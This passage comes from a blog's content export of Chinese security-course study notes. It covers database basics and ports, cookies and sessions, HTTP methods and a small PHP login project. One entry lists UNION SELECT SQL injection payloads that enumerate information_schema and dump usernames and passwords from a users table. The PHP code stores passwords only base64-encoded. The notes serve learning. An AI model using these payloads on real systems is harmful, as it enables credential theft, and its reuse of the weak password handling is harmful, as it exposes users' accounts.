<br>2.事务一致性<br> 3.二维表格模型</td><td>1.使用键值对存数据 <br>2.分布式<br>3.一般不支持ACID特性<br> 4.严格意义上不是数据库，而是一种数据结构化存储集合</td></tr><tr><td>优点</td><td>1.易理解<br>2.使用方便<br>3.易维护<br>4.支持SQL可复杂查询</td><td>1.无SQL层解析，读写性能高<br>2.基于键值对，数据没有耦合性，易于扩展<br>3.存储数据格式多样化</td></tr><tr><td>缺点</td><td>1.维护成本高<br>2.结构固定</td><td>1.不支持SQL<br>2.无事务处理</td></tr></tbody></table><h1 id="常见数据库的信息"><a href="#常见数据库的信息" class="headerlink" title="常见数据库的信息"></a>常见数据库的信息</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="端口：3306"><a href="#端口：3306" class="headerlink" title="端口：3306"></a>端口：3306</h3><p>默认库information_schema和其中的表SCHEMATA（存储用户创建所有数据库的库名[SCHEMA_NAME]）、TABLES和COLUMNS</p><h2 id="SQLSever"><a href="#SQLSever" class="headerlink" title="SQLSever"></a>SQLSever</h2><h3 id="端口：1433"><a href="#端口：1433" class="headerlink" title="端口：1433"></a>端口：1433</h3><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><h3 id="端口：1521"><a href="#端口：1521" class="headerlink" title="端口：1521"></a>端口：1521</h3><h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><h3 id="端口：5432或5433"><a href="#端口：5432或5433" class="headerlink" title="端口：5432或5433"></a>端口：5432或5433</h3><h2 id="BD2"><a href="#BD2" class="headerlink" title="BD2"></a>BD2</h2><h3 id="端口：5000"><a href="#端口：5000" class="headerlink" title="端口：5000"></a>端口：5000</h3><h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><p>一种轻量级数据库，常用于移动端。<br>特点：一个库多个表，可用sqlite或sqlite2打开</p><h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><h3 id="端口：27017"><a href="#端口：27017" class="headerlink" title="端口：27017"></a>端口：27017</h3>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第五周 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNION SELECT 命令 SQL注入</title>
      <link href="/2019/08/14/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/08/14/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="1、查看当前数据库信息"><a href="#1、查看当前数据库信息" class="headerlink" title="1、查看当前数据库信息"></a>1、查看当前数据库信息</h1><pre><code>and 2=1 union select  database(),version(),user(),4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123551167.png" alt></p><h1 id="2、通过tables表查询相关信息"><a href="#2、通过tables表查询相关信息" class="headerlink" title="2、通过tables表查询相关信息"></a>2、通过tables表查询相关信息</h1><pre><code>and 1=2 union select (select group_concat(table_name,&#39;~&#39;,table_schema,&#39;~&#39;,column_name) from information_schema.columns where table_schema=&#39;content&#39; or table_name=&#39;users&#39; ),2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123637831.png" alt></p><h1 id="3、根据查询信息查看单个表的详细信息"><a href="#3、根据查询信息查看单个表的详细信息" class="headerlink" title="3、根据查询信息查看单个表的详细信息"></a>3、根据查询信息查看单个表的详细信息</h1><h2 id="第一个表"><a href="#第一个表" class="headerlink" title="第一个表"></a>第一个表</h2><pre><code>and 1=2 union select (select group_concat(id,&#39;|&#39;,title,&#39;|&#39;,value,&#39;|&#39;,time,&#39;|&#39;,ip) from test.content),2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123734085.png" alt></p><h2 id="第二个表"><a href="#第二个表" class="headerlink" title="第二个表"></a>第二个表</h2><pre><code>and 1=2 union select (select group_concat(id,&#39;|&#39;,username,&#39;|&#39;,passwd,&#39;|&#39;,user_ip,&#39;|&#39;,join_date) from test.users),2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123814194.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 第五周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL导入表查询数据</title>
      <link href="/2019/08/13/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/"/>
      <url>/2019/08/13/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="导入数据库"><a href="#导入数据库" class="headerlink" title="导入数据库"></a>导入数据库</h1><h2 id="1、创建数据库"><a href="#1、创建数据库" class="headerlink" title="1、创建数据库"></a>1、创建数据库</h2><p><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813023930457.png" alt><br>查看当前用户状态<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813023948231.png" alt><br>查看使用的数据库<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813024032661.png" alt><br>切换数据库<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813024047700.png" alt></p><h2 id="2、导入数库"><a href="#2、导入数库" class="headerlink" title="2、导入数库"></a>2、导入数库</h2><p><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813025138322.png" alt><br>成功效果<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813025452962.png" alt><br>        因为数据库中information_schema在内存中，不在文件中<br>            SCHEMATA    存着当前数据库的名字<br>            TABLES        存着所有数据库中的表<br>            COLUMNS    存着所有字段名<br>        所以可以通过对information_schema数据库的查询来间接查询导入的数据库<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813025511496.png" alt><br>跳转到information_schema数据库，进行查询<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813025545487.png" alt></p><h2 id="3、开始查询"><a href="#3、开始查询" class="headerlink" title="3、开始查询"></a>3、开始查询</h2><p>通过tables查询列名:<br>            查询的是SCHEMATA 存放当前数据库的名字<br>                Show columns from SCHEMATA         查询的是该表的设计表<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813025558591.png" alt><br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813025602743.png" alt><br>通过表内的列名查询表内的数据,查询该表的table_name的内容<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813025610766.png" alt><br>结果<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813025618714.png" alt><br>最下面是最新加入的表在COLUMNS表中查看相应的字段内容<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813025642861.png" alt><br>在navicat的表格设计中有22字段<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813025700645.png" alt><br>下面查找关于table_name和column_name的相关字段<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813025709863.png" alt><br>然后通过SELECT语句进行查询<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813025719358.png" alt><br>另外一个表<br><img src="/SQL%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/20190813025727700.png" alt><br>至此查询完毕</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 第五周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cookie、Session和Token</title>
      <link href="/2019/08/11/Cookie%E3%80%81Session%E5%92%8CToken/"/>
      <url>/2019/08/11/Cookie%E3%80%81Session%E5%92%8CToken/</url>
      
        <content type="html"><![CDATA[<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>存储在客户端<br>第一次登陆后，服务器给浏览器一些数据作为用户凭证，作为再次请求数据的同行凭证。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>1、会话cookie：<br>生命周期和浏览器一致。<br>2、持久cookie：<br>存放在客户端硬盘上。</p><h1 id="session"><a href="#session" class="headerlink" title="session"></a>session</h1><p>存储在服务器</p><h1 id="session和cookie的结合"><a href="#session和cookie的结合" class="headerlink" title="session和cookie的结合"></a>session和cookie的结合</h1><p>1、服务端存储session，浏览器存储session_id，交互中通过id在服务端查找session的相关信息。<br>该模式：server side session<br>2、将session加密存储到cookie中<br>该模式：client side session</p><h1 id="token"><a href="#token" class="headerlink" title="token"></a>token</h1><p>由uid+time+sign[+固定参数]<br>Token认证方式类似临时证书，是一种服务端无状态的认证方式（服务端不会保存身份认证的相关数据）</p><h2 id="token特点："><a href="#token特点：" class="headerlink" title="token特点："></a>token特点：</h2><p>可以抵抗CSRF攻击</p><h3 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h3><p>浏览器不会自动在headers中添加用户的token信息，攻击者也无法访问用户的token，提交的表单无法通过服务器过滤。<br>token类似令牌，无状态，用户信息被加密到token中，服务器可以收到token后解密认证</p><h1 id="补充：关于浏览器缓存的分类："><a href="#补充：关于浏览器缓存的分类：" class="headerlink" title="补充：关于浏览器缓存的分类："></a>补充：关于浏览器缓存的分类：</h1><h2 id="1、强缓存："><a href="#1、强缓存：" class="headerlink" title="1、强缓存："></a>1、强缓存：</h2><p>直接在本地缓存中取资源，不会和服务器通信，http返回状态码200。<br>由headers中的Expires和cache-control（优先级较高）决定的</p><h2 id="2、协商缓存："><a href="#2、协商缓存：" class="headerlink" title="2、协商缓存："></a>2、协商缓存：</h2><p>由服务器决定是否在本地缓存<br>由两组headers值：<br>i. Last-Modified / If – Modified – Since<br>ii. Etag / If – None – Match（优先级较高）</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第四周 </tag>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GET、POST和REQUEST</title>
      <link href="/2019/08/11/GET%E3%80%81POST%E5%92%8C/"/>
      <url>/2019/08/11/GET%E3%80%81POST%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h1><h2 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h2><p>1、请求服务器信息资源<br>2、数据传输在URL后 以 ? 分割多个参数用 &amp; 连接。 URL采用的是ASCII，需要先转换成ASCII再进行数据传输<br>3、数据长度一般不超过 2KB<br>4、服务端在地址栏接收参数 Request.QueryString 获取参数<br>5、数据显式显示安全度相对较低</p><h1 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h1><h2 id="特点：-1"><a href="#特点：-1" class="headerlink" title="特点："></a>特点：</h2><p>1、表单中的各段内容放到HTML HEADER中一起传送到ACTION属性指定的URL地址。用户看不到此过程<br>2、传送数据量大，一般没有限制<br>3、服务器接收表单 Request.Form 获取提交数据<br>4、数据传输性相对较好</p><h1 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h1><p>支持GET和POST两种传输方式，是PHP预定义的超级全局变量</p><h1 id="GET和POST的本质"><a href="#GET和POST的本质" class="headerlink" title="GET和POST的本质"></a>GET和POST的本质</h1><p>GET/POST是HTTP协议中的两种发送请求方法，HTTP底层是TCP/IP，所以本质上GET和POST是没有区别的。<br>HTTP作为传输协议标准，对其进行了区分。</p><h2 id="GET传输数据流程"><a href="#GET传输数据流程" class="headerlink" title="GET传输数据流程"></a>GET传输数据流程</h2><h3 id="GET数据传输只传输一次"><a href="#GET数据传输只传输一次" class="headerlink" title="GET数据传输只传输一次"></a>GET数据传输只传输一次</h3><p>浏览器将HTTP header和data一并发出，服务器响应200（返回数据）</p><h2 id="POST传输数据流程"><a href="#POST传输数据流程" class="headerlink" title="POST传输数据流程"></a>POST传输数据流程</h2><h3 id="POST数据传输传输两次"><a href="#POST数据传输传输两次" class="headerlink" title="POST数据传输传输两次"></a>POST数据传输传输两次</h3><p>浏览器先发送header，服务器响应100，继续浏览器发送data服务器响应200（返回数据）</p><h1 id="GET传输方式和POST传输方式比较"><a href="#GET传输方式和POST传输方式比较" class="headerlink" title="GET传输方式和POST传输方式比较"></a>GET传输方式和POST传输方式比较</h1><pre><code>1、GET与POST都有自己的传输规则2、在网络环境好的前提下，发一次包和发两次包的时间差距可以忽略；在网络环境不好的前提下，发两次包更能验证数据包的完整性3、并不是所有的浏览器都会在POST中发送两次包（火狐，只发一次包）</code></pre>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第四周 </tag>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP小项目</title>
      <link href="/2019/08/11/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/"/>
      <url>/2019/08/11/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="实现的功能"><a href="#实现的功能" class="headerlink" title="实现的功能"></a>实现的功能</h1><pre><code>1、注册、登陆、注销  设置session2、页面信息展示3、页面信息编辑4、文件上传、密码修改、页面信息删除、头像更换</code></pre><h1 id="代码详解"><a href="#代码详解" class="headerlink" title="代码详解"></a>代码详解</h1><h2 id="1、登陆页面"><a href="#1、登陆页面" class="headerlink" title="1、登陆页面"></a>1、登陆页面</h2><h3 id="html文件展示"><a href="#html文件展示" class="headerlink" title="html文件展示"></a>html文件展示</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;登陆&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;div align=&quot;center&quot; &gt;        &lt;div class=&quot;top&quot;&gt;            &lt;h1&gt;登陆&lt;/h1&gt;        &lt;/div&gt;        &lt;form action=&quot;denglu.php&quot; method=&quot;post&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;手机号/邮箱/用户名&quot;&gt;            &lt;br&gt;            &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;密码&quot;&gt;            &lt;br&gt;            &lt;input type=&quot;text&quot; class=&quot;input_code&quot; name=&quot;verifycode&quot; placeholder=&quot;验证码&quot;&gt;            &lt;img class=&quot;verifycode&quot; src=&quot;https://passport.360.cn/captcha.php?m=create&amp;app=i360&amp;scene=login&amp;userip=&amp;level=default&amp;sign=8820a4&amp;r=1564540365&amp;border=none&amp;_=1564540365972&quot;&gt;            &lt;br&gt;            &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登陆&quot;&gt;            &lt;a href=&quot;reg_user.html&quot; class=&quot;reg_user&quot;&gt;注册用户&lt;/a&gt;        &lt;/form&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果图<br><img src="/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/20190811015828574.png" alt></p><h3 id="php代码处理逻辑"><a href="#php代码处理逻辑" class="headerlink" title="php代码处理逻辑"></a>php代码处理逻辑</h3><pre><code>&lt;?phpsession_start();    // 使用session// 接受到登陆页面传来的数据对数据进行处理// 与数据库的数据进行匹对$tmp=$_POST;// 登陆页面传来的数组数据// 调用用户的数据库文件进行遍历匹对$file=fopen(&quot;../data/user.db&quot;,&quot;r&quot;);if($file==null){    echo &quot;user.db文件打开失败&quot;;    return;}// 开始循环比对数据库$flag=true;// 设定是否在数据库找到匹配的用户名和密码//$isend=feof($file); // 是否到达文件末尾  feof() 到达返回 1  每到达返回0while(!feof($file)) {    // 按行读取数据    $userdb = fgets($file);    // 用户数据库的存储方式按照顺序存储    //    0     1     2      3    // 用户名、邮箱、手机号、密码    $userdb = explode(&quot;||&quot;, $userdb);//    var_dump($userdb);//    var_dump($tmp);    if (count($userdb) != 3)    {        continue;    }    $uid=$userdb[0];// 用户ID    $use=base64_decode($userdb[1]);// base64 用户名解码    //    $mail=base64_decode($userdb[1]);// base64 邮箱解码    //    $phone=base64_decode($userdb[2]);// base64 手机解码    $pass=base64_decode($userdb[2]);// base64 密码解码//    var_dump($use);//    var_dump($passwd);//    var_dump($tmp);    if(($tmp[&quot;username&quot;]==$use)&amp;&amp;($tmp[&quot;password&quot;]==$pass))        //        $tmp[&#39;username&#39;]==$mail&amp;&amp;$tmp[&#39;password&#39;]==$passwd||        //        $tmp[&#39;username&#39;]==$phone&amp;&amp;$tmp[&#39;password&#39;]==$passwd)    {        // session 中需要保存：用户名 时间是在编辑中保存，ID是读取注册时用户的ID        $_SESSION[&#39;uname&#39;]=$use;// 将登陆成功的用户信息存储到 SESSION中        echo &quot;&lt;script&gt;alert(&#39;登陆成功!请稍候&#39;);location.href=&#39;../houtai/houtai.php&#39;;&lt;/script&gt;&quot;;        $flag=false;        return;    }}if($flag){    echo &quot;&lt;script&gt;alert(&#39;用户名或密码错误！请重新输入&#39;);location.href=&#39;denglu.html&#39;;&lt;/script&gt;&quot;;}</code></pre><h2 id="2、注册界面"><a href="#2、注册界面" class="headerlink" title="2、注册界面"></a>2、注册界面</h2><h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;注册&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div align=&quot;center&quot;&gt;    &lt;div&gt;        &lt;h1&gt;注册用户&lt;/h1&gt;    &lt;/div&gt;    &lt;form action=&quot;reg_user.php&quot; method=&quot;post&quot;&gt;        &lt;br&gt;        &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;请输入用户名&quot;&gt;        &lt;br&gt;        &lt;input type=&quot;text&quot; name=&quot;pass1&quot; placeholder=&quot;请输入密码&quot;&gt;        &lt;br&gt;        &lt;input type=&quot;text&quot; name=&quot;pass2&quot; placeholder=&quot;请输入密码&quot;&gt;        &lt;br&gt;        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;注册&quot;&gt;    &lt;/form&gt;&lt;/div&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果图<br><img src="/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/20190811020212163.png" alt></p><h3 id="php代码逻辑"><a href="#php代码逻辑" class="headerlink" title="php代码逻辑"></a>php代码逻辑</h3><pre><code>&lt;?phpsession_start();// 用来保存用户的注册信息// 将用户信息保存到user.db中$tmp=$_POST;//var_dump($tmp);if($tmp==null){    echo &quot;数据传输失败&quot;;    die();}// 讲述据打开 user.db文件$file=fopen(&quot;../data/user.db&quot;,&quot;r&quot;);// 读取指针if($file==null){    echo &quot;user.db文件打开失败&quot;;    die();}// 遍历用户数据库，防止重复注册$id=0;// 设置当前数据库已经注册的用户数//$flag=true;// 标志当前是否有相同的用户名/邮箱  默认没有相同的用户名/邮箱while(!feof($file)){    $userdata=explode(&quot;||&quot;,fgets($file));    // 对注册数据编码    $username=base64_encode($tmp[&#39;username&#39;]);    $password=base64_encode($tmp[&#39;pass1&#39;]);//    var_dump($userdata);//    var_dump($username);    if(count($userdata)!=3)    {        continue; // 防止取到不完整的数据影响判断    }    if($username==$userdata[1])    {//        $flag=false;// 存在相同的用户名/邮箱        echo &quot;&lt;script&gt;alert(&#39;用户名/油箱名 重复请勿重复注册!!&#39;);location.href=&#39;reg_user.html&#39;;&lt;/script&gt;&quot;;        die();    }    $id++;  // 记录当前注册的用户的个数}echo $id;fclose($file);/////////////////////////////////////////////////////////////////// 存储注册的用户名和密码// user.db 数据按照 id||用户名||密码 的格式存储$file=fopen(&quot;../data/user.db&quot;,&quot;a&quot;);if($file==null){    echo &quot;user.db文件打开失败&quot;;    die();}// 合并数据 使用 || 分割字符串$data=&quot;$id||$username||$password\n&quot;;// 写入数据文件fwrite($file,$data);echo &quot;&lt;script&gt;alert(&#39;注册成功!请登陆&#39;);location.href=&#39;denglu.html&#39;;&lt;/script&gt;&quot;;fclose($file);</code></pre><h2 id="3、注销"><a href="#3、注销" class="headerlink" title="3、注销"></a>3、注销</h2><h3 id="php代码逻辑-1"><a href="#php代码逻辑-1" class="headerlink" title="php代码逻辑"></a>php代码逻辑</h3><pre><code>&lt;?phpsession_start();// setcookie(&quot;username&quot;,&quot;&quot;,time()-1);session_destroy();// 销毁sessionecho &quot;&lt;script&gt;location.href=&#39;../xianshi.php&#39;&lt;/script&gt;&quot;;?&gt;</code></pre><h2 id="4、密码修改"><a href="#4、密码修改" class="headerlink" title="4、密码修改"></a>4、密码修改</h2><h3 id="html代码"><a href="#html代码" class="headerlink" title="html代码"></a>html代码</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;修改密码&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;div align=&quot;center&quot;&gt;        &lt;h1&gt;修改密码&lt;/h1&gt;    &lt;/div&gt;    &lt;hr&gt;    &lt;div align=&quot;center&quot;&gt;        &lt;form action=&quot;getpass.php&quot; method=&quot;post&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;ypass&quot; placeholder=&quot;原始密码&quot;&gt;            &lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;xpass1&quot; placeholder=&quot;请输入新密码&quot;&gt;            &lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;xpass2&quot; placeholder=&quot;重新输入&quot;&gt;            &lt;br&gt;            &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;        &lt;/form&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果图<br><img src="/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/20190811020654847.png" alt></p><h3 id="php代码逻辑-2"><a href="#php代码逻辑-2" class="headerlink" title="php代码逻辑"></a>php代码逻辑</h3><pre><code>&lt;?phpsession_start();// 必须在第一行$ulogin=$_SESSION[&quot;uname&quot;];if($ulogin==null){    echo &quot;&lt;script&gt;alert(&#39;请登陆！&#39;);location.href=../dlzc/denglu.html;&lt;/script&gt;&quot;;}// 调试信息var_dump($ulogin);// 用户名和密码都进行了 base64编码$pass=$_POST;//var_dump($pass);// 判断当前登录的用户//var_dump($_SESSION[&#39;uname&#39;]);// 读取文档查找相应的用户名和密码$file=file(&quot;../data/user.db&quot;);if($file==null){    echo &quot;../data/user.db文件打开失败&quot;;    die();}// 循环遍历数组for($i=0,$j=0;$i&lt;count($file);$i++,$j++){    $filer=explode(&quot;||&quot;,$file[$i]);//    var_dump($_SESSION[&quot;uname&quot;]);//    var_dump(base64_decode($filer[1]));    if($ulogin==base64_decode($filer[1]))    {        // 找到用户名        // 判断输入的是否是原始密码        // post传进来的 $pass数组分别是 ypass xpass1 xpass2        // 两次输入的密码是否一致//        var_dump($pass[&#39;ypass&#39;]);//        var_dump($pass[&#39;xpass1&#39;]);//        var_dump($pass[&#39;xpass2&#39;]);        if($pass[&quot;xpass1&quot;]==$pass[&quot;xpass2&quot;])        {            // 输入密码和原密码是否一致            if($pass[&quot;ypass&quot;]==base64_decode($filer[2]))            {                // 验证身份，修改密码生效                // 新密码写入文件                // 记录该行用户信息并删除                $uid=$filer[0]; // 帐户ID                $uname=$filer[1]; // 帐户名                // 新密码                $upass=$pass[&#39;xpass1&#39;];                continue;            }            else{                echo &quot;&lt;script&gt;alert(&#39;请输入正确的密码&#39;);location.href=getpass.html;&lt;/script&gt;&quot;;            }        }        else{            echo &quot;&lt;script&gt;alert(&#39;请输入一致密码&#39;);location.href=getpass.html;&lt;/script&gt;&quot;;        }    }    $xyhu[$j]=$file[$i];// 删除用户信息的数组}// var_dump($xyhu);//echo $xyhu[1];//echo $xyhu[2];//echo $xyhu[3];// 将删除后的用户信息写入文件$fil=fopen(&quot;../data/user.db&quot;,&quot;w&quot;);if($fil==null){    echo &quot;user.db文件打开失败&quot;;    die();}//var_dump(count($xyhu));for($i=1;$i&lt;=count($xyhu);$i++){    fwrite($fil,$xyhu[$i]);}fclose($fil);// 将新的用户信息追加到文件中$file1=fopen(&quot;../data/user.db&quot;,&quot;a&quot;);if($file1==null){    echo &quot;user.db文件打开失败&quot;;    die();}// 进行64编码存储//$uname=base64_encode($uname);$upass=base64_encode($upass);// 调试信息var_dump($uname);var_dump($upass);$udata=&quot;$uid||$uname||$upass\n&quot;;var_dump($udata);fwrite($file1,$udata);fclose($file1);echo &quot;&lt;script&gt;alert(&#39;密码修改成功，请重新登陆&#39;);location.href=../dlzc/denglu.html;&lt;/script&gt;&quot;;// 退出登录session_destroy();// 销毁session?&gt;</code></pre><h2 id="5、登陆后的后台"><a href="#5、登陆后的后台" class="headerlink" title="5、登陆后的后台"></a>5、登陆后的后台</h2><h3 id="html代码-1"><a href="#html代码-1" class="headerlink" title="html代码"></a>html代码</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;        &lt;img src=&quot;../upload_file/files/1.gif&quot; &gt;        &lt;a id=&quot;link&quot; href=&quot;getpass.html&quot;&gt;修改密码&lt;/a&gt;    &lt;/div&gt;    &lt;div align=&quot;center&quot;&gt;        &lt;h1&gt;控制后台&lt;/h1&gt;        &lt;br&gt;        &lt;a href=&quot;../xianshi.php&quot;&gt;            &lt;button &gt;                数据展示            &lt;/button&gt;        &lt;/a&gt;        &lt;a id=&quot;link&quot; href=&quot;edit.php&quot;&gt;            &lt;button &gt;                数据编辑            &lt;/button&gt;        &lt;/a&gt;        &lt;br&gt;        &lt;a href=&quot;../upload_file/upload.html&quot;&gt;            &lt;button&gt;                图片上传            &lt;/button&gt;        &lt;/a&gt;        &lt;a href=&quot;../upload_file/upload.html&quot;&gt;            &lt;button&gt;                修改头像            &lt;/button&gt;        &lt;/a&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果图<br><img src="/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/20190811021009666.png" alt></p><h2 id="6、文章编辑"><a href="#6、文章编辑" class="headerlink" title="6、文章编辑"></a>6、文章编辑</h2><h3 id="html代码与php逻辑代码"><a href="#html代码与php逻辑代码" class="headerlink" title="html代码与php逻辑代码"></a>html代码与php逻辑代码</h3><pre><code>&lt;?phpsession_start();?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div align=&quot;left&quot;&gt;    &lt;a href=&quot;houtai.php&quot;&gt;返回&lt;/a&gt;&lt;/div&gt;&lt;div align=&quot;center&quot;&gt;    &lt;div&gt;        &lt;h1&gt;数据编辑            &lt;?php            // 判断是否登陆            